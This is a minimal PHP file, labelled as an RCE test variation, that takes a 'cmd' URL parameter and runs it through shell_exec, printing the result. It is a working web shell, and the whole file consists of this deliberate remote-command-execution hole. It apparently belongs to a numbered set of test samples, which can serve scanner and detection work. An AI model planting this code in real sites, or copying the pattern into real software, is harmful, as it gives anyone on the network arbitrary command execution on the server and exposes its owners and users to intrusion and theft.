<?php
// RCE test variation #1403
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>